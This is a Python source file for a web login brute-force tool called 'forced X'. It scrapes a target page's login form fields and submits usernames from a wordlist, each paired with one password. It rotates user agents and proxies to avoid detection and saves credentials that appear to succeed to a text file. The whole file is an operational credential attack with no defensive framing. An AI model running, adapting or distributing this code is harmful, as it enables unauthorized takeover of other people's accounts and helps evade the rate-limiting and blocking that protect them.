W,R,G,Y,B,P,C,N,GR= '\033[97;1m','\033[91;1m','\033[92;1m','\033[93;1m','\033[94;1m','\033[95;1m','\033[96;1m','\x1b[0m',"\033[40m\033[1;30m"
error=f"{R}[ ! ]{W} {GR}"
done=f"{G}[ + ]{W} "
start=f"{B}[ * ]{W} "
sts=f"{R}[ * ]{W} "
import requests
import mechanize
import sys
import time
import random
import os
import json
#import user_agent
from bs4 import BeautifulSoup as bs
#user_=user_agent.generate_user_agent(os=('android'))
user_list=[]
file=open('source/user_agent_list.txt','r').readlines()
for uu in file:
	uu=uu.strip()
	user_list.append(uu)
user_=random.choice(user_list)
form_list=[]
login_form=[]
proxy_list=[]
def baner():
	print(f'''{R}
    ____                         __   _  __
   / __/___  _____________  ____/ /  | |/ /
  / /_/ __ \/ ___/ ___/ _ \/ __  /   |   / 
 / __/ /_/ / /  / /__/  __/ /_/ /   /   |  
/_/  \____/_/   \___/\___/\__,_/   /_/|_| 

{W}[{R} * {W}]{G} forced X {R}Brute force {P}v2\033[40m\033[1;30m by issam iso{W}
''')
def get_form_name(url):
	try:req=requests.get(url).text
	except Exception as ex:
		print(error+str(ex))
		sys.exit()
	form=bs(req,'html.parser').find('form').find_all('input')
	for uu in form:
		try:
			form_list.append(uu['name'])
		except:continue
def try_select_from(url,uform,pform,ll,w):
	br=mechanize.Browser()
	br.set_handle_robots(False)
	br.addheaders=[("User-Agent",user_)]
	try:
		br.open(url)
	except:
		print(error+"Error url open!")
		sys.exit()
	try:
		br.select_form(nr=0)
	except:
		print(error+'Error select_from user,pass')
		sys.exit()
	try:
		br.form[uform]="Emails@gmail.com"
		br.form[pform]="testpassword"
		br.submit()
		return 1
	except:
		if w:
			print(error+f"form {uform} # {pform} select failed!")
			print(start+f"trying form {G}"+str(ll))
		return 0
def sives(url,worduser,wordpass):
	txt=f"""
from: {url}
username: {worduser}
password: {wordpass}
	"""
	file=open('page_login.txt','a').write(txt+'\n')
def wordsusers_passw(url,userform,passform,keyfalse,keytrue,usernames,passlist,proxy):
	baner()
	if userform == 0 or userform=="0" and passform == "0" or passform == 0:
		get_form_name(url)
		kk=0
		pp=1
		lens=len(form_list)
		if lens <=3:
			uses=form_list[0]
			passw=form_list[1]
		elif lens >=4:
			for aa in range(len(form_list)):
				kk+=1
				pp+=1
				try:
					uform=form_list[kk]
					pform=form_list[pp]
					what=try_select_from(url,uform,pform,kk,True)
					if what != 0:
						uses=uform
						passw=pform
						break
				except:pass
	elif userform != 0 or userform != '0' and passform != "0" or passform != 0:
		uses=userform
		passw=passform
	aa=try_select_from(url,uses,passw,0,False)
	if aa == 0:
		print(error+"Please Select form username,password!")
		sys.exit()
	elif aa != 0:
		print(done+f'found form [{uses},{passw}]')
	if keyfalse == '00iso':
		keyfalse=passw
	elif keytrue == "00iso":
		keytrue='codingbayissamiso4fbi:issamiso4gooodbay'
	try:file=open(usernames,'r').readlines()
	except:
		print(error+f"not found path{R} {usernames}")
		sys.exit()
	worduser=open(usernames,'r').readlines()
	if proxy != 'Null':
		print(start+'use proxy')
		if '.txt' in proxy:
			try:
				file=open(proxy,'r')
			except:
				print(error+f'Not found path {proxy}')
				sys.exit()
			prox=open(proxy,'r').readlines()
			for ppp in prox:
				ppp=ppp.strip()
				if "http://" in ppp:ppp=ppp.replace('http://','').strip()
				if "https://" in ppp:ppp=ppp.replace('https://','').strip()
				if "/" in ppp:ppp=ppp.replace('/','').strip()
				print(done+'proxy : '+ppp)
				proxy_list.append(ppp)
		if '.txt' not in proxy:
			proxy_list.append(proxy)
	passlist=passlist.strip()
	for wordusers in worduser:
		
		wordusers=wordusers.strip()
		browser=mechanize.Browser()
		browser.set_handle_robots(False)
		browser.addheaders=[('User-Agent',user_)]
		browser.open(url)
		if proxy != 'Null':
			ranproxy=random.choice(proxy_list)
			browser.set_proxies({
			"http":'http://'+ranproxy,
			"https":'https://'+ranproxy
				})
		browser.select_form(nr=0)
		browser.form[uses]=wordusers
		browser.form[passw]=passlist
		browser.submit()
		urlsw=browser.geturl()
		ml=browser.response().read()
		html=ml.decode()
		if keyfalse not in html:
			print(done+G+f"username :{P} {wordusers}")
			print(done+G+f"password :{P} {passlist}")
			sives(url,wordusers,passlist)
			input(start+'Enter to continue exit:CTRL ^C : ')
		elif keyfalse in html:
			print(sts+f"username [{wordusers}] password [{passlist}] {GR}#status {R}failed!")
		elif keytrue in html:
			print(start+'Form keytrue!')
			print(done+G+f"username :{P} {wordusers}")
			print(done+G+f"password :{P} {passlist}")
			sives(url,wordusers,passlist)
			input(start+'Enter to continue exit:CTRL ^C : ')

			
			
	
	
			
																
																																										

		
